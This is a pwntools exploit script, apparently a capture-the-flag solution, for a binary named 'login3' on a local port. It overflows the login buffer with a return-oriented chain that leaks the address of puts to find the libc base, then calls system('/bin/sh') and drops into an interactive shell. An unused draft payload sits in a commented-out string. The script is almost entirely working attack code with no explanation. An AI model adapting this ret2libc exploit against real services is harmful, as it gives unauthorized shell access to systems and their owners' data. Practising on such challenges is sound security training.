from pwn import *
context.log_level = 'debug'

TARGET = './login3'
LIBC = './libc-2.27.so'
HOST = 'localhost'
PORT = 10003

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
0x400808
c
''')
elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

rdi = 0x00400873

r.recvuntil('ID:')

payload = ''
payload += 'A' * 40
payload += p64(rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
'''
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['puts'])
payload += p64(elf.got['puts'])
payload += p64(0xc0bebeef)
payload += p64(0xc0bebeef)
payload += p64(0xc0bebeef)
payload += p64(call)
payload += p64(1)
payload += p64(2) 
payload += p64(3)
payload += p64(4) 
payload += p64(5)
payload += p64(6)
payload += p64(7)
payload += p64(8)
payload += p64(elf.sym['main'])
'''
r.sendline(payload)

r.recvuntil('password\n')
leak = u64(r.recv(6).ljust(8, '\x00'))

base = leak - libc.sym['puts'] 
system = base + libc.sym['system']
binsh = base + next(libc.search("/bin/sh"))

r.recvuntil('ID:')

payload = ''
payload += 'A' * 40
payload += p64(rdi)
payload += p64(binsh)
payload += p64(rdi+1)
payload += p64(system)

r.sendline(payload)
r.interactive()

r.close()
